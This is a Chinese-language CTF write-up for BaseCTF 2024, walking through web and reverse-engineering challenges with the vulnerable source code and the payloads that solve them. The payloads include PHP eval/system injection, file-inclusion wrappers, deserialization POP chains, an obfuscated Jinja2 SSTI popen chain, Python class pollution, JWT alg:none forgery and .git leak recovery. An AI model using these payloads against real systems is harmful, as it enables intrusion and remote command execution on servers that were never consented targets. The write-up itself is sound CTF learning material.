---
title: "BASECTF2024"
date: "2026-04-09T00:00:00+08:00"
lastmod: "2026-04-09T00:00:00+08:00"
slug: "BASECTF2024"
summary: "Basectf"
tags:
  - "Web"
  - "BASECTF"
params:
  protected: false
  commentId: "BASECTF2024"
  legacyId: "BASECTF2024"
---

# Basectf

## web

### week1

#### 1.喵喵喵

```
 <?php
highlight_file(__FILE__);
error_reporting(0);

$a = $_GET['DT'];

eval($a);

?> 
```

```
?DT=system("cat /flag");
```

#### 2.HTTP 是什么呀

![image](/assets/img/1769504688301.png)

按步骤来，

不过

we1c%00me用we1c%2500me来绕过

#### 3.md5绕过欸

```
 <?php
highlight_file(__FILE__);
error_reporting(0);
require 'flag.php';

if (isset($_GET['name']) && isset($_POST['password']) && isset($_GET['name2']) && isset($_POST['password2']) ){
    $name = $_GET['name'];
    $name2 = $_GET['name2'];
    $password = $_POST['password'];
    $password2 = $_POST['password2'];
    if ($name != $password && md5($name) == md5($password)){
        if ($name2 !== $password2 && md5($name2) === md5($password2)){
            echo $flag;
        }
        else{
            echo "再看看啊，马上绕过嘞！";
        }
    }
    else {
        echo "错啦错啦";
    }

}
else {
    echo '没看到参数呐';
}
?> 
```

传参

数组绕过

#### 4.A Dark Room

f12看源码

#### 5.upload

上传图片马，改后缀，蚁剑链接

#### 6.Aura 酱的礼物

```
 <?php
highlight_file(__FILE__);
// Aura 酱，欢迎回家~
// 这里有一份礼物，请你签收一下哟~
$pen = $_POST['pen'];
if (file_get_contents($pen) !== 'Aura')
{
    die('这是 Aura 的礼物，你不是 Aura！');
}

// 礼物收到啦，接下来要去博客里面写下感想哦~
$challenge = $_POST['challenge'];
if (strpos($challenge, 'http://jasmineaura.github.io') !== 0)
{
    die('这不是 Aura 的博客！');
}

$blog_content = file_get_contents($challenge);
if (strpos($blog_content, '已经收到Kengwang的礼物啦') === false)
{
    die('请去博客里面写下感想哦~');
}

// 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~
$gift = $_POST['gift'];
include($gift); 
```



```
pen=data://text/plain,Aura&challenge=http://jasmineaura.github.io@127.0.0.1&gift=php://filter/convert.base64-encode/resource=flag.php
```



### week2

#### 7. ez_ser

```
 <?php
highlight_file(__FILE__);
error_reporting(0);

class re{
    public $chu0;
    public function __toString(){
        if(!isset($this->chu0)){
            return "I can not believes!";
        }
        $this->chu0->$nononono;
    }
}

class web {
    public $kw;
    public $dt;

    public function __wakeup() {
        echo "lalalla".$this->kw;
    }

    public function __destruct() {
        echo "ALL Done!";
    }
}

class pwn {
    public $dusk;
    public $over;

    public function __get($name) {
        if($this->dusk != "gods"){
            echo "什么，你竟敢不认可?";
        }
        $this->over->getflag();
    }
}

class Misc {
    public $nothing;
    public $flag;

    public function getflag() {
        eval("system('cat /flag');");
    }
}

class Crypto {
    public function __wakeup() {
        echo "happy happy happy!";
    }

    public function getflag() {
        echo "you are over!";
    }
}
$ser = $_GET['ser'];
unserialize($ser);
?>
```

poc

```
<?php
class re {
    public $chu0;
}

class web {
    public $kw;
}

class pwn {
    public $dusk = "gods";
    public $over;
}

class Misc {}

$a = new web();
$b = new re();
$c = new pwn();
$d = new Misc();

$a->kw = $b;      // web::__wakeup -> re::__toString
$b->chu0 = $c;    // re::__toString -> pwn::__get
$c->over = $d;    // pwn::__get -> Misc::getflag

echo urlencode(serialize($a));
?>

```

```
?ser=O:3:"web":1:{s:2:"kw";O:2:"re":1:{s:4:"chu0";O:3:"pwn":2:{s:4:"dusk";s:4:"gods";s:4:"over";O:4:"Misc":0:{}}}}
```

#### 8.一起吃豆豆

看index.js搜索over

base64解码得到

BaseCTF{J5_gam3_1s_easy_t0_h4ck!!}

#### 9.你听不到我的声音

```
 <?php
highlight_file(__FILE__);
shell_exec($_POST['cmd']); 
```

```
cmd=cat /flag > 1.txt
```

访问

```
/1.txt
```

#### 10.RCEisamazingwithspace

```
 <?php
highlight_file(__FILE__);
$cmd = $_POST['cmd'];
// check if space is present in the command
// use of preg_match to check if space is present in the command
if (preg_match('/\s/', $cmd)) {
    echo 'Space not allowed in command';
    exit;
}

// execute the command
system($cmd); 
```

空格过滤

```
cmd=cat${IFS}/flag
```

### week3

#### 11.原神来了（nooo）

```
 <?php
highlight_file(__FILE__);
error_reporting(0);

include 'flag.php';
if (sizeof($_POST['len']) == sizeof($array)) {
  ys_open($_GET['tip']);
} else {
  die("错了！就你还想玩原神？❌❌❌");
}

function ys_open($tip) {
  if ($tip != "我要玩原神") {
    die("我不管，我要玩原神！😭😭😭");
  }
  dumpFlag();
}

function dumpFlag() {
  if (!isset($_POST['m']) || sizeof($_POST['m']) != 2) {
    die("可恶的QQ人！😡😡😡");
  }
  $a = $_POST['m'][0];
  $b = $_POST['m'][1];
  if(empty($a) || empty($b) || $a != "100%" || $b != "love100%" . md5($a)) {
    die("某站崩了？肯定是某忽悠干的！😡😡😡");
  }
  include 'flag.php';
  $flag[] = array();
  for ($ii = 0;$ii < sizeof($array);$ii++) {
    $flag[$ii] = md5(ord($array[$ii]) ^ $ii);
  }
  
  echo json_encode($flag);
} 错了！就你还想玩原神？❌❌❌
```

#### 12.复读机

强制让手注,本地fenjing秒了

```
BaseCTF{%print(''['_''_''cla''ss''_''_']|attr('_''_''mr''o''_''_')|attr('_''_''get''item''_''_')(1)|attr('_''_''subc''lasses''_''_')()|attr('_''_''geti''tem''_''_')(137)|attr('_''_''ini''t''_''_')|attr('_''_''glo''bals''_''_')|attr('_''_''get''item''_''_')('po''pen')('cat ${HOME%%root}flag')|attr('read')())%}
```

#### 13.过滤个不停

```
<?php

$incompetent = $_POST['incompetent'];
$Datch = $_POST['Datch'];

if ($incompetent !== 'HelloWorld') {
    die('写出程序员的第一行问候吧！');
}

//这是个什么东东？？？
$required_chars = ['s', 'e', 'v', 'a', 'n', 'x', 'r', 'o'];
$is_valid = true;

foreach ($required_chars as $char) {
    if (strpos($Datch, $char) === false) {
        $is_valid = false;
        break;
    }
}

if ($is_valid) {

    $invalid_patterns = ['php://', 'http://', 'https://', 'ftp://', 'file://' , 'data://', 'gopher://'];

    foreach ($invalid_patterns as $pattern) {
        if (stripos($Datch, $pattern) !== false) {
            die('此路不通换条路试试?');
        }
    }


    include($Datch);
} else {
    die('文件名不合规 请重试');
}
?> 
```

```
foreach ($required_chars as $char) {
    if (strpos($Datch, $char) === false) {
        $is_valid = false;
        break;
    }
} 
```

遍历寻找re中的char，若我传入的datch有这些字母，死

```
if ($is_valid) {

    $invalid_patterns = ['php://', 'http://', 'https://', 'ftp://', 'file://' , 'data://', 'gopher://'];

    foreach ($invalid_patterns as $pattern) {
        if (stripos($Datch, $pattern) !== false) {
            die('此路不通换条路试试?');
        }
    }
```

if true，，

invalid_patterns（无效模式）'php://', 'http://', 'https://', 'ftp://', 'file://' , 'data://', 'gopher://'

但没禁/

若果写了这些，此路不通换条路试试?

```
日志文件包含：
因为是ngins框架
读/var/log/nginx/access.log（恰好包含那些字母）
可以ua头注入木马
然后post利用参数进行命令执行
```

```
为什么可以进行 UA 注入？
日志的生成机制
每当你访问一个网页，Nginx 都会为了审计和调试，把你的访问轨迹记录在 access.log 中。默认的日志格式通常包含以下字段：
$remote_addr - $remote_user [$time_local] "$request" $status $body_bytes_sent "$http_referer" "$http_user_agent"
```

于是保存了ua的信息

啊啊啊啊

```
O:10:"LogService":2:{s:10:"*handler";O:10:"FileStream":3:{s:4:"path";s:3:"any";s:4:"mode";s:5:"debug";s:7:"content";s:20:"system('cat /flag');";}s:12:"*formatter";O:13:"DateFormatter":0:{}}
```

```
答案的
```

```
user=hackerhackerhackerhacker&bio=AAAAA";s:10:"preference";O:10:"LogService":2:{s:10:"*handler";O:10:"FileStream":3:{s:4:"path";s:3:"any";s:4:"mode";s:5:"debug";s:7:"content";s:20:"system('cat /flag');";}s:12:"*formatter";O:13:"DateFormatter":0:{}}
```

```
";s:3:"bio";s:164:"AAAAA";s:10:"preference";O:10:"LogService":2:{s:10:"*handler";O:10:"FileStream":3:{s:4:"path";s:3:"any";s:4:"mode";s:5:"debug";s:7:"content";s:20:"system('cat /flag');";}s:12:"*formatter";O:13:"DateFormatter":0:{}}
```

需要死掉：

```
";s:3:"bio";s:164:"AAAAA  24字
```

在这个攻击链子前加上";s:10:"preference";来利用参数，因为

```
user=hackerhackerhackerhacker&bio=AAAAA%22%3bs%3a10%3a%22preference%22%3bO%3A10%3A%22LogService%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A10%3A%22FileStream%22%3A3%3A%7Bs%3A4%3A%22path%22%3Bs%3A3%3A%22any%22%3Bs%3A4%3A%22mode%22%3Bs%3A5%3A%22debug%22%3Bs%3A7%3A%22content%22%3Bs%3A20%3A%22system%28%27cat+%2Fflag%27%29%3B%22%3B%7Ds%3A12%3A%22%00%2A%00formatter%22%3BO%3A13%3A%22DateFormatter%22%3A0%3A%7B%7D%7D
```

杀掉bio，让perence成为属性名

传入得到flag





### week4

#### 14.nojwt

这里都是无回显

根据报错，附件等信息

yakit构建：

```
POST /login HTTP/1.1
Host: challenge.imxbt.cn:30135
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Content-Type: application/json

{"username": "xxx", "password": "xxx"}
```

得到token：

![image](/assets/img/1772873926275.png)

这里把alg改成none

不存在密钥

然后

```
GET /flag HTTP/1.1
Host: challenge.imxbt.cn:30135
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ4eHgiLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3NzI4NzU5NzJ9.
```

```
HTTP 的 Authorization 请求头字段通常遵循以下格式：
Authorization: <type> <credentials>

<type>：告知服务器该使用哪种方式来解析后面的凭证。常见的类型包括 Basic（用户名:密码）、Digest 以及我们这里用的 Bearer。

<credentials>：即具体的凭证内容，在你的题目中就是那个长长的 JWT 字符串。

如果不加 Bearer 前缀，服务器的 Web 框架（如 Flask）或 JWT 库可能无法正确识别并提取 Token，导致报错或提示 Token is missing。
```

这里：

JWT 规范中允许 `alg: none`（无签名算法），用于某些受信任的内部通信。当后端配置不当时，攻击者可以：

1. 将 **Header** 中的算法改为 `none`。
2. 篡改 **Payload** 中的关键数据（如将 `role: user` 改为 `role: admin`）。
3. **移除签名**：直接删掉 Token 最后一个点 `.` 之后的内容。

### FIN

#### 15.jinjamark

/index

尝试ssti：Hello 别急着ssti注入嘛，先去/magic那里给我变个魔术

/flag

直接bp爆破数字，得到：

```python
BLACKLIST_IN_index = ['{','}']
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):#hasattr() 函数用于判断对象是否包含对应的属性。
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
@app.route('/magic',methods=['POST', 'GET'])
def pollute():
    if request.method == 'POST':
        if request.is_json:
            merge(json.loads(request.data), instance)
            return "这个魔术还行吧"
        else:
            return "我要json的魔术"
    return "记得用POST方法把魔术交上来"
```

分析，依旧使用了merge合并为字典，于是可以进行修改最后的blacklist的值

```
利用__class__返回该对象所属的类
利用__init__拿到初始化函数
利用__globals__得到所有的函数相关的方法
最后改变其中BLACKLIST_IN_index的值
```

构造：

```json
{
    "__class__":{
        "__init__":{
            "__globals__":{
                "BLACKLIST_IN_index" : []
            }
        }
    }
}
```

污染使得index可以执行ssti语句：

```json
{{lipsum.__globals__.os.popen('cat /flag').read()}}
```



#### 16.Lucky Number

你不会以为这里真的有flag吧？

想要flag的话先提交我的幸运数字5346

但是我的主人觉得我泄露了太多信息，就把我的幸运数字给删除了

但是听说在heaven中有一种create方法，配合__kwdefaults__可以创造出任何事物，你可以去/m4G1c里尝试着接触到这个方法

下面是前人留下来的信息，希望对你有用

```python
from flask import Flask,request,render_template_string,render_template
from jinja2 import Template
import json
import heaven
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

class cls():
    def __init__(self):
        pass

instance = cls()

BLACKLIST_IN_index = ['{','}']
def is_json(data):
    try:
        json.loads(data)
        return True
    except ValueError:
        return False

@app.route('/m4G1c',methods=['POST', 'GET'])
def pollute():
    if request.method == 'POST':
        if request.is_json:
            merge(json.loads(request.data), instance)
            result = heaven.create()
            message = result["message"]
            return "这个魔术还行吧" + message
        else:
            return "我要json的魔术"
    return "记得用POST方法把魔术交上来"


#heaven.py

def create(kon="Kon", pure="Pure", *, confirm=False):
    if confirm and "lucky_number" not in create.__kwdefaults__:
        return {"message": "嗯嗯，我已经知道你要创造东西了，但是你怎么不告诉我要创造什么？", "lucky_number": "nope"}
    if confirm and "lucky_number" in create.__kwdefaults__:
        return {"message": "这是你的lucky_number，请拿好，去/check下检查一下吧", "lucky_number": create.__kwdefaults__["lucky_number"]}

    return {"message": "你有什么想创造的吗？", "lucky_number": "nope"}
```

看向最后heaven.py

```
利用__class__返回该对象所属的类
利用__init__拿到初始化函数
利用__globals__得到所有的函数相关的方法
利用heaven中的create方法
修改__kwdefaults__中confirm 和 "lucky_number"的值
```

了解一下：Python 特殊属性 __kwdefaults__ 默认值字典

```python
Python 中，__kwdefaults__ 是一个特殊的属性，用于存储函数或方法的关键字参数的默认值。这个属性在函数对象中存在，可以通过函数对象的 __kwdefaults__ 属性来访问。包含仅限关键字 形参 默认值的 字典。

下面是一个简单的示例说明__kwdefaults__的使用：

def foo(name='Tom', *, message='Hello'):
    return f"{message}, {name}!"

print(foo.__kwdefaults__)
# {'message': 'Hello'}
print(foo.__defaults__)
# ('Tom',)
在这个示例中，foo 函数关键字参数message，并且它有一个默认值'Hello'。通过访问 greet.__kwdefaults__ 属性，可以获取到关键字参数及其对应的默认值的字典。

区别
__defaults__ - 位置参数或关键字参数的任何默认值的元组
__kwdefaults__ - 仅关键字参数的任何默认值的映射
```

最后是

```json
{
    "__class__":{
        "__init__":{
            "__globals__":{
                "heaven":{
                    "create":{
                        "__kwdefaults__":{
                            "confirm": true,
                            "lucky_number":"5346"//直接传数字不行
                        }
                    }
                }
            }   
        }
    }
}
```

再提交：

![image](/assets/img/1775740761214.png)

然后去这个页面正常ssti即可

#### 17.back_to_future

https://www.anquanke.com/post/id/236487

[比较复杂的/.git泄露]

find songthing盲猜robots协议

发现.git/

存在git文件泄露，于是githack提取源码：

```
D:\githack\GitHack-master>python githack.py http://challenge.imxbt.cn:32101/.git/
[+] Download and parse index file ...
[+] README.md
[OK] README.md
```

readme写道：

```
# My Website

This is my web project.

Oops, I place flag here, but i deleted it!
```

要追溯历史文件

想到了bugku做到的source，参考下解法,利用wget指令得到git文件

下载/.git/被ban，/.git/config成功

```
[core]
	repositoryformatversion = 0
	filemode = false
	bare = false
	logallrefupdates = true
	symlinks = false
	ignorecase = true
```

于是读取 /.git/logs/HEAD查看提交日志

```
 0000000000000000000000000000000000000000 8f7720b7891039b394e26e67ff10d6c6d2a144d5 Kengwang <github@kengwang.com.cn> 1724351558 +0800	commit (initial): Initial Commit
8f7720b7891039b394e26e67ff10d6c6d2a144d5 9d85f10e0192ef630e10d7f876a117db41c30417 Kengwang <github@kengwang.com.cn> 1724351673 +0800	commit: Add What
9d85f10e0192ef630e10d7f876a117db41c30417 e2bc04bc70f7b7476ae7ad0e943ef62aa2b5556e Kengwang <github@kengwang.com.cn> 1724351728 +0800	commit: Remove Flag
```

于是抓取9d85f10e0192ef630e10d7f876a117db41c30417的内容：/.git/objects/9d/85f10e0192ef630e10d7f876a117db41c30417

删除已有的.git文件

```
rm -rf .git
```

移入下载得到的文件

```
mv 85f10e0192ef630e10d7f876a117db41c30417 .git/objects/9d/
```

使用git打印改commit的内容

```
git cat-file -p 9d85f10e0192ef630e10d7f876a117db41c30417
tree b5a27f2196dceb21778f2d6c7d8536bdca8534d2
parent 8f7720b7891039b394e26e67ff10d6c6d2a144d5
author Kengwang <github@kengwang.com.cn> 1724351673 +0800
committer Kengwang <github@kengwang.com.cn> 1724351673 +0800
gpgsig -----BEGIN PGP SIGNATURE-----
 
 iQIzBAABCAAdFiEEdNAOWRbUaClRFMzdntTLigz0KxgFAmbHhMkACgkQntTLigz0
 KxjgGg/9FVaa8rX4eVHSPneKWutmjPHXzBw09TjLi68Ty0SnNl5H8EOObAhLyCL6
 EqtnzhmnMn+nB5d0EzJOK9fSXuBjU/g9Qclsm35s6xvG49NA8q1V5OnmDI+/wInO
 eEf/RF1wHFRQ4JXnao9pPxLFauD3z8Scfgle/7InRMm24/uVy4bHjdirpOGAxsOC
 VUB4bwKL94QpOgMZsEnzYJuFhYqewUQOM2Yz6jr2Wio758dFGQPRNqgZzVvUlM7m
 /FUiUEEgUqNb1S5I2/ouf8HjvUN+/3Wr2tvvieDX+C2/3zczaaDXjgGhhTodooXO
 QM6290UCL8eq9M+T95zJAB2oLA5AJBxp5rUYhAE1g08wrT8CW854/wZDi5ZpxjwT
 haRfWPLNWTZWNIco4/R56OuTjP2AWu9FBpchgk+oFxj9lFSVeeKADbNzSp4t2Wik
 Ipgm6YOtVTW6R/9f6wzyD0+0TMD9L/4xFk6dxoG+lf8Ibb5jU7eoDaxCz67NVjK5
 NjYjp0X8iyTS0h3u/DlmtSOSugrLzbBiF7eP2MXltbLlr6EF71WmW37X3w4zYhDY
 sTHMdCu2OUKdSOT08maPcS2+wWFhEfhAXba8lzhOE8XykzoCFuvZCvq1FMsVBMMs
 uDDke0u3nodhSM5+Kukch8LbNm4ruc35NDocS9wd1iQyVb/3yrk=
 =5gJ8
 -----END PGP SIGNATURE-----

Add What

```

得到tree值：/.git/objects/b5/a27f2196dceb21778f2d6c7d8536bdca8534d2

重复以上操作，移动文件，然后查看文件内容：

```
mkdir -p .git/objects/b5/
mv a27f2196dceb21778f2d6c7d8536bdca8534d2 .git/objects/b5/

git cat-file -p b5a27f2196dceb21778f2d6c7d8536bdca8534d2
100644 blob 0d2c09b9b0c9e912fe9404a3c36bd7ec2dbb080e    README.md
100644 blob db8b21d3ebddd6826ee6f2583a6e4f56b3e9a736    flag.txt
```

存在flag.txt

下载：

```
wget http://challenge.imxbt.cn:32101/.git/objects/db/8b21d3ebddd6826ee6f2583a6e4f56b3e9a736
```

最后重复

```
# 创建目录
mkdir -p .git/objects/db/

# 移动文件
mv 8b21d3ebddd6826ee6f2583a6e4f56b3e9a736 .git/objects/db/

# 见证奇迹的时刻
git cat-file -p db8b21d3ebddd6826ee6f2583a6e4f56b3e9a736
BaseCTF{1aa62024-5a12-4f55-80fa-cb9c41e1154b}  
```













## re

#### 1.You are good at IDA

f5

```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char var9[17]; // [rsp+27h] [rbp-9h] BYREF

  _main(argc, argv, envp);
  strcpy(var9, "Y0u_4Re_");
  printf("This is the first part");
  putchar(10);
  printf("%s", var9);
  putchar(10);
  printf("You can shift f12 look look");
  return 0;
}
```

f12+shift

对着第二部分按x

```
 mov     ecx, 39h ; '9'  ; Character
.text:00000000004015D2                 call    putchar
.text:00000000004015D7                 mov     ecx, 30h ; '0'  ; Character
.text:00000000004015DC                 call    putchar
.text:00000000004015E1                 mov     ecx, 30h ; '0'  ; Character
.text:00000000004015E6                 call    putchar
.text:00000000004015EB                 mov     ecx, 64h ; 'd'  ; Character
.text:00000000004015F0                 call    putchar
.text:00000000004015F5                 mov     ecx, 5Fh ; '_'  ; Character
.text:00000000004015FA                 call    putchar
.text:00000000004015FF                 mov     ecx, 34h ; '4'  ; Character
.text:0000000000401604                 call    putchar
.text:0000000000401609                 mov     ecx, 37h ; '7'  ; Character
.text:000000000040160E                 call    putchar
.text:0000000000401613                 mov     ecx, 5Fh ; '_'  ; Character
.text:0000000000401618                 call    putchar
```

The last part is in a named Interesting

点开![image](/assets/img/1769508389525.png)



```
00000000040163C                 push    rbp
.text:000000000040163D                 mov     rbp, rsp
.text:0000000000401640                 sub     rsp, 20h
.text:0000000000401644                 mov     ecx, 69h ; 'i'  ; Character
.text:0000000000401649                 call    putchar
.text:000000000040164E                 mov     ecx, 64h ; 'd'  ; Character
.text:0000000000401653                 call    putchar
.text:0000000000401658                 mov     ecx, 34h ; '4'  ; Character
.text:000000000040165D                 call    putchar
.text:0000000000401662                 nop
```

flag  BaseCTF{Y0u_4Re_900d_47_id4}

#### 2.UPX mini

upx脱壳![image](/assets/img/1769515465040.png)

随后打开发现QmFzZUNURntIYXYzX0BfZzBvZF90MW0zISEhfQ==

base64解码得到BaseCTF{Hav3_@_g0od_t1m3!!!}